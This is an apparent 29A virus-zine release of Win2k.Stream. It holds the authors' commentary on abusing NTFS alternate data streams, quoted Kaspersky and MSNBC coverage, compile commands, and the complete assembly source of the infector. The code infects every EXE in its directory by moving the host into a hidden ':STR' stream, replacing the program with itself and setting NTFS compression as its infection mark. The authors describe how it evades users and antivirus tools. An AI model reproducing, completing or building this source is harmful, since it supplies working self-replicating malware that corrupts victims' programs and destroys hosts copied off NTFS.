
COMMENT#
                       	ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                       	³    Win2k.Stream    ³
                       	ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                      ³ by Benny/29A and Ratter ³
                      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


Let us introduce very small and simple infector presenting how to use features
of NTFS in viruses. This virus loox like standard Petite-compressed PE file.
However, it presents the newest way of PE file infecting method.

How the virus worx? It uses streamz, the newest feature of NTFS filesystem
and file compression, already implemented in old NTFS fs.


 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³ Basic principles of NTFS streamz ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

How the file loox? Ya know that the file contains exactly the same what you can
see when you will open it (e.g. in WinCommander). NTFS, implemented by
Windows 2000, has new feature - the file can be divided to streamz. The content
what you can see when you will open the file is called Primary stream - usually
files haven't more than one stream. However, you can create NEW stream ( = new
content) in already existing file without overwritting the content.

Example:

addressing of primary stream ->	<filename> e.g. "calc.exe"
addressing of other streamz ->	<filename>:<stream name> e.g. "calc.exe:stream"

If you have NTFS, you can test it. Copy to NTFS for instance "calc.exe", and
then create new file "calc.exe:stream" and write there "blahblah". Open
"calc.exe". Whats there? Calculator ofcoz. Now open "calc.exe:stream". Whats
there? "blahblah", the new file in the old one :)

Can you imagine how useful r streamz for virus coding?

The virus infects file by moving the old content to the new stream and replacing
the primary stream with virus code.

File (calc.exe) before infection:

  ÉÍCalc.exeÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
  ºÚÄPrimary stream (visible part)Ä¿º
  º³         Calculator            ³º
  ºÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙº
  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

File (calc.exe) after infection:

  ÉÍCalc.exeÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
  ºÚÄPrimary stream (calc.exe)Ä¿ÚÄNext stream (calc.exe:STR)Ä¿ º
  º³         Virus             ³³         Calculator         ³ º
  ºÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ º
  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

Simple and efficent, ain't it?


 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³ Details of virus ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

*	The virus infects all EXE files in actual directory.

*	The virus uses as already-infected mark file compression. All infected
	files are compressed by NTFS and virus then does not infect already
	compressed files. Well, almost all files after infection r smaller than
	before, so user won't recognize virus by checking free disk space :)

*	If user will copy the infected file to non-NTFS partition (in this case
	only primary stream is copied), the host program will be destroyed and
	instead of running host program virus will show message box. That can
	be also called as payload :P

*	The virus is very small, exactly 3628 bytes, becoz it's compressed by
	Petite 2.1 PE compression utility (http://www.icl.ndirect.co.uk/petite/).

*	The disinfection is very easy - just copy the content of <file>:STR to
	<file> and delete <file>:STR. If you want to create sample of infected
	file, then just copy the virus to some file and copy any program (host
	program) to <file>:STR. Thats all! However, AVerz have to rebuild their
	search engine to remove this virus, becoz until now, they had no fucking
	idea what are streamz :)

*	This virus was coded in Czech Republic by Benny/29A and Ratter, on our
	common VX meeting at Ratter's city... we just coded it to show that
	Windows 2000 is just another OS designed for viruses... it really is :)

*	We would like to thank GriYo for pointing us to NTFS new features.
	The fame is also yourz, friend!


 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³ In the media ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


 AVP's description:
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This is the first known Windows virus using the "stream companion" infection
method. That method is based on an NTFS feature that allows to create multiple
data streams associated with a file.

*NTFS Streams*
---------------

Each file contains at least one default data stream that is accessed just by
the file name. Each file may also contain additional stream(s) that can be
accessed by their personal names (filename:streamname).

The default file stream is the file body itself (in pre-NTFS terms). For
instance, when an EXE file is executed the program is read from the default
file stream; when a document is opened, its content is also read from the
default stream.

Additional file streams may contain any data. The streams cannot be accessed or
modified without reference to the file. When the file is deleted, its streams
are deleted as well; if the file is renamed, the streams follow its new name.

In the Windows package there is no standard tool to view/edit file streams. To
"manually" view file streams you need to use special utilities, for instance
the FAR utility with the file steams support plug-in (Ctrl-PgDn displays file
streams for selected file).

*Virus Details*
----------------

The virus itself is a Windows application (PE EXE file) compressed using the
Petite PE EXE file compressor and is about 4K in size. When run it infects all
EXE files in the current directory and then returns control to the host file.
If any error occurs, the virus displays the message:

 Win2k.Stream by Benny/29A & Ratter
 This cell has been infected by [Win2k.Stream] virus!

While infecting a file the virus creates a new stream associated with the victim
file. That stream has the name "STR", i.e. the complete stream name is
"FileName:STR". The virus then moves the victim file body to the STR stream
(default stream, see above) and then overwrites the victim file body (default
stream) with its (virus) code.

As a result, when an infected file is executed Windows reads the default stream
(which is overwritten by virus code) and executes it. Also, Windows reports the
same file size for all infected files - that is the virus length.

To release control to the host program the virus just creates a new process by
accessing the original file program using the name "FileName:STR".

That infection method should work on any NTFS system, but the virus checks the
system version and runs only under Win2000.
 

 AVP's press release:
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

*A New Generation of Windows 2000 Viruses is Streaming Towards PC Users*
------------------------------------------------------------------------

Moscow, Russia, September 4, 2000 – Kaspersky Lab announces the discovery of
W2K.Stream virus, which represents a new generation of malicious programs for
Windows 2000. This virus uses a new breakthrough technology based on the
"Stream Companion" method for self-embedding into the NTFS file system.

The virus originates from the Czech Republic and was created at the end of
August by the hackers going by the pseudonyms of Benny and Ratter. To date,
Kaspersky Lab has not registered any infections resulting from this virus;
however, its working capacity and ability for existence "in-the-wild" are
unchallenged.

"Certainly, this virus begins a new era in computer virus creation," said
Eugene Kaspersky, Head of Anti-Virus Research at Kaspersky Lab. "The ’Stream
Companion’ technology the virus uses to plant itself into files makes its
detection and disinfection extremely difficult to complete.”

Unlike previously known methods of file infection (adding the virus body at
beginning, ending or any other part of a host file), the "Stream" virus
exploits the NTFS file system (Windows NT/2000) feature, which allows multiple
data streams. For instance, in Windows 95/98 (FAT) files, there is only one
data stream – the program code itself. Windows NT/2000 (NTFS) enables users
to create any number of data streams within the file: independent executable
program modules, as well as various service streams (file access rights,
encryption data, processing time etc.). This makes NTFS files very flexible,
allowing for the creation of user-defined data streams aimed at completing
specific tasks.

"Stream" is the first known virus that uses the feature of creating multiple
data streams for infecting files of the NTFS file system (see picture 1). To
complete this, the virus creates an additional data stream named "STR" and
moves the original content of the host program there. Then, it replaces the
main data stream with the virus code. As a result, when the infected program
is run, the virus takes control, completes the replicating procedure and then
passes control to the host program.

*"Stream" file infection procedure*
------------------------------------

File before infection              File after infection

ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
³°°°°°°°°°°°°°°°°°°°³              ³°°°°°°°°°°°°°°°°°°°³
³°°°°°°°°°°°°°°°°°°°³              ³°°° main stream°°°°³
³°°°°°°°°°°°°°°°°°°°³              ³°°° virus body°°°°°³
³°°°°main stream°°°°³              ³°°°°°°°°°°°°°°°°°°°³
³°°°°°°°°°°°°°°°°°°°³              ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³°°°°program body°°°³              ³°°°°°°°°°°°°°°°°°°°³
³°°°°°°°°°°°°°°°°°°°³              ³°additional stream°³
³°°°°°°°°°°°°°°°°°°°³              ³°°°program body°°°°³
³°°°°°°°°°°°°°°°°°°°³              ³°°°°°°°°°°°°°°°°°°°³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´              ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³±±±±±±±±±±±±±±±±±±±³              ³±±±±±±±±±±±±±±±±±±±³
³±±service streams±±³              ³±±service streams±±³
³±±±±±±±±±±±±±±±±±±±³              ³±±±±±±±±±±±±±±±±±±±³
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

"By default, anti-virus programs check only the main data stream. There will be
no problems protecting users from this particular virus," Eugene Kaspersky
continues. "However, the viruses can move to additional data streams. In this
case, many anti-virus products will become obsolete, and their vendors will be
forced to urgently redesign their anti-virus engines."


 In MSNBC's news:
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

*New trick can hide computer viruses*
*But experts question danger posed by ‘Stream’ technology*
-----------------------------------------------------------

Sept. 6 — A new kind of computer virus has been released, but security experts
are in disagreement over just how menacing it is. The virus demonstrates a
technique that future writers can use to hide their malicious software from
most current antivirus scanners. But some antivirus companies are playing down
the threat.

THE VIRUS, CALLED W2K.STREAM, poses little threat — it was written as a
relatively benign “proof of concept.” But, according to a source who requested
anonymity, it was posted on several virus writer Web sites over Labor Day
weekend — making copycats possible.

The virus takes advantage of a little-used feature included in Windows 2000 and
older Windows NT systems that allows programs to be split into pieces called
streams. Generally, the body of a program resides in the main stream. But other
streams can be created to store information related to what’s in the main
stream. Joel Scambray, author of “Hacking Exposed,” described these additional
streams as “Post-it notes” attached to the main file.

The problem is that antivirus programs only examine the main stream. W2K.Stream
demonstrates a programmer’s ability to create an additional stream and hide
malicious code there.

“Certainly, this virus begins a new era in computer virus creation,” said
Eugene Kaspersky, Head of Anti-Virus Research at Kaspersky Lab, in a press
release. “The ‘Stream Companion’ technology the virus uses to plant itself into
files makes its detection and disinfection extremely difficult to complete.”
       
*THIS BUG ISN’T DANGEROUS*
---------------------------

No W2K.stream infections have been reported, and experts don’t believe the
virus is “in the wild” — circulating on the Internet — yet. At any rate, this
virus actually makes things easy for antivirus companies. If a user is
infected, the program creates an alternate stream and places the legitimate
file in this alternate location; the virus replaces it as the main stream. That
makes detection by current antivirus products easy. But future viruses could
do just the opposite, evading current antivirus products.

One antivirus researcher who requested anonymity called release of the bug
“somewhat akin to the first macro virus.” He added that reengineering antivirus
software to scan for multiple streams would be a complicated effort.
“In this case, many anti-virus products will become obsolete, and their vendors
will be forced to urgently redesign their anti-virus engines,” Kaspersky said.
       
*AN OLD ISSUE*
---------------

There is nothing new about the potential of exploiting the multiple stream
issue; Scambray hints at the problem in the book “Hacking Exposed,” and
described it even more explicitly in a 1998 Infoworld.com article.

The SANS Institute, a group of security researchers, issued an “alert”
criticizing antivirus companies for not updating their products to scan the
contents of any file stream earlier.

“We found that the scanners were incapable of identifying viruses stored within
an alternate data stream,” the report said. “For example if you create the file
MyResume.doc:ILOVEYOU.vbs and store the contents of the I Love You virus within
the alternate data stream file, none of the tested virus scanners were capable
of finding the virus during a complete disk scan.”

But some antivirus companies described the threat as minimal because the
alternate stream trick only hides the bug while it’s stored on a victim’s
computer. Pirkka Palomaki, Director of Product Marketing for F-Secure Corp.,
said for the virus to actually run, it has to come out of hiding and load into
main memory.

“It would be detected as it tried to activate,” Palomaki said. “But this
signifies importance of real-time protection.” He added the virus would still
have to find its way onto a victim’s computer; and that victim would have to
be tricked into installing the virus using one of the traditional methods,
such as clicking on an infected e-mail attachment.

“It could increase the ability to for scanners to miss something,” said Pat
Nolan, virus researcher at McAfee Corp. “But we’re on top of it. If there is
a vulnerability, it will be short-lived.”


 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³ How to compile it? ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

Use Petite version 2.1 (http://www.icl.ndirect.co.uk/petite/).

tasm32 /ml /m9 /q stream
tlink32 -Tpe -c -x -aa stream,,,import32
pewrsec stream.exe
petite -9 -e2 -v1 -p1 -y -b0 -r* stream.exe



And here comes the virus source...
#


.586p
.model	flat,stdcall


include	win32api.inc				;include filez
include	useful.inc

extrn	ExitProcess:PROC			;used APIz
extrn	VirtualFree:PROC
extrn	FindFirstFileA:PROC
extrn	FindNextFileA:PROC
extrn	FindClose:PROC
extrn	WinExec:PROC
extrn	GetCommandLineA:PROC
extrn	GetModuleFileNameA:PROC
extrn	DeleteFileA:PROC
extrn	ReadFile:PROC
extrn	CopyFileA:PROC
extrn	WriteFile:PROC
extrn	CreateFileA:PROC
extrn	CloseHandle:PROC
extrn	MessageBoxA:PROC
extrn	GetFileSize:PROC
extrn	VirtualAlloc:PROC
extrn	DeviceIoControl:PROC
extrn	GetFileAttributesA:PROC
extrn	GetTempFileNameA:PROC
extrn	CreateProcessA:PROC
extrn	GetVersion:PROC


FSCTL_SET_COMPRESSION	equ	9 shl 16 or 3 shl 14 or 16 shl 2

						;compression flag
STARTUPINFO	STRUCT				;used by CreateProcessA API
	cb		DWORD	?
	lpReserved	DWORD	?
	lpDesktop	DWORD	?
	lpTitle		DWORD	?
	dwX		DWORD	?
	dwY		DWORD	?
	dwXSize		DWORD	?
	dwYSize		DWORD	?
	dwXCountChars	DWORD	?
	dwYCountChars	DWORD	?
	dwFillAttribute	DWORD	?
	dwFlags		DWORD	?
	wShowWindow	WORD	?
	cbReserved2	WORD	?
	lpReserved2	DWORD	?
	hStdInput	DWORD	?
	hStdOutput	DWORD	?
	hStdError	DWORD	?
STARTUPINFO	ENDS
PROCESS_INFORMATION	STRUCT
	hProcess	DWORD	?
	hThread		DWORD	?
	dwProcessId	DWORD	?
	dwThreadId	DWORD	?
PROCESS_INFORMATION	ENDS


@pushvar	macro	variable, empty		;macro for pushing variablez
	local   next_instr
	ifnb <empty>
	%out too much arguments in macro '@pushvar'
	.err
	endif
	call next_instr
	variable
next_instr:
	endm


.data

	extExe		db	'*.exe',0		;search mask

	fHandle		dd	?			;file search handle
	file_name	db	MAX_PATH dup(?)		;actual program name
			db	MAX_PATH dup(?)
	file_name2	db	MAX_PATH dup(?)		;temprorary file
			db	4 dup (?)
	WFD		WIN32_FIND_DATA	?		;win32 find data
	proc_info	PROCESS_INFORMATION	<>	;used by CreateProcessA
	startup_info	STARTUPINFO	<>		;...
.code
Start:						;start of virus
	call	GetVersion			;get OS version
	cmp	al,5				;5 = Win2000
	jnz	msgBox				;quit if not Win2000

	mov	edi,offset file_name
	push	MAX_PATH
	push	edi
	push	0
	call	GetModuleFileNameA		;get path+filename of actual
						;program
	push	offset WFD
	push	offset extExe
	call	FindFirstFileA			;find first file to infect
	test	eax,eax
	jz	end_host
	mov	[fHandle],eax			;save handle


search_loop:
	call	infect				;try to infect file

	push	offset WFD
	push	dword ptr [fHandle]
	call	FindNextFileA			;try to find next file
	test	eax,eax
	jne	search_loop			;and infect it

	push	dword ptr [fHandle]
	call	FindClose			;close file search handle

end_host:
	mov	esi,offset file_name		;get our filename
	push	esi
	@endsz
	dec	esi
	mov	edi,esi
	mov	eax,"RTS:"			;append there :"STR" stream
	stosd					;name
	pop	esi

	call	GetCommandLineA			;get command line
	xchg	eax,edi				;to EDI

;esi - app name
;edi - cmd line
	xor	eax,eax
	push	offset proc_info
	push	offset startup_info
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	edi
	push	esi
	call	CreateProcessA			;jump to host code
	xchg	eax,ecx
	jecxz	msgBox				;if error, show message box

end_app:
	push	0
	call	ExitProcess			;exit

msgBox:	push	1000h				;show some lame msg box :)
	@pushsz	"Win2k.Stream by Benny/29A & Ratter"	;copyleft :]
	@pushsz	"This cell has been infected by [Win2k.Stream] virus!"
	push	0				;with name of virus and authorz
	call	MessageBoxA
	jmp	end_app



infect:	push	offset [WFD.WFD_szFileName]
	call	GetFileAttributesA		;check if the file is NTFS
	test	eax,800h			;compressed = already infected
	jz	next_infect
	ret					;quit then

next_infect:
	push	offset [WFD.WFD_szFileName]
	mov	byte ptr [flagz],OPEN_EXISTING
	call	Create_File			;open found program
	jz	infect_end

	xor	eax,eax
	push	eax
	@pushvar	<dd	?>
	push	eax
	push	eax
	push	4
	@pushvar	<dd	1>		;default compression
	push	FSCTL_SET_COMPRESSION
	push	ebx				;NTFS compress it =
	call	DeviceIoControl			;mark as already infected
						; = and save disk space :)
	push	ebx
	call	CloseHandle			;close file handle

	mov	esi,offset file_name2
	push	esi
	push	0
	@pushsz	"str"
	@pushsz	"."
	call	GetTempFileNameA		;create name for temp file
	test	eax,eax
	jz	infect_end

	mov	edi,offset [WFD.WFD_szFileName]
	push	0
	push	esi
	push	edi
	call	CopyFileA			;copy there victim program
	test	eax,eax
	jz	infect_end


	push	0
	push	edi
	push	offset file_name
	call	CopyFileA			;copy ourself to victim program

	push	esi

	mov	esi,edi
	@endsz
	xchg	esi,edi
	dec	edi
	mov	eax,"RTS:"			;append :"STR" stream to
	stosd					;victim program filename
	xor	al,al
	stosb

	call	Create_File			;open victim file
	jz	infect_end
	
	push	0
	push	ebx
	call	GetFileSize			;get its size
	xchg	eax,edi
		
	push	PAGE_READWRITE
	push	MEM_COMMIT or MEM_RESERVE
	push	edi
	push	0
	call	VirtualAlloc			;allocate enough memory
	test	eax,eax				;for file content
	jz	infect_end_handle

	xchg	eax,esi
	
	xor	eax,eax
	push	eax
	@pushvar	<file_size	dd	?>
	push	edi
	push	esi
	push	ebx
	call	ReadFile			;read file content to
	test	eax,eax				;allocated memory
	jz	infect_end_handle
	
	push	ebx
	call	CloseHandle			;close its file handle
	
	push	offset file_name2
	call	DeleteFileA			;delete temporary file

	mov	byte ptr [flagz],CREATE_ALWAYS
	push	offset [WFD.WFD_szFileName]
	call	Create_File			;open stream
	jz	infect_end_dealloc
	
	push	0
	mov	ecx,offset file_size
	push	ecx
	push	dword ptr [ecx]
	push	esi
	push	ebx
	call	WriteFile			;write there victim program
	test	eax,eax
	jz	infect_end_handle

infect_end_handle:
	push	ebx
	call	CloseHandle			;close its file handle
infect_end_dealloc:
	push	MEM_DECOMMIT
	push	dword ptr [file_size]
	push	esi
	call	VirtualFree			;free allocated memory
	push	MEM_RELEASE
	push	0
	push	esi
	call	VirtualFree			;release reserved part of mem
infect_end:
	ret

; [esp+4] - file_name	
Create_File:					;proc for opening file
	xor	eax,eax
	push	eax
	push	eax
	db	6ah
flagz	db	OPEN_EXISTING			;variable file open flag
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	dword ptr [esp+1ch]
	call	CreateFileA			;open file
	xchg	eax,ebx				;handle to EBX
	inc	ebx				;is EBX -1?
	lahf					;store flags
	dec	ebx				;correct EBX
	sahf					;restore flags
	retn	4				;quit from proc

end	Start					;end of virus
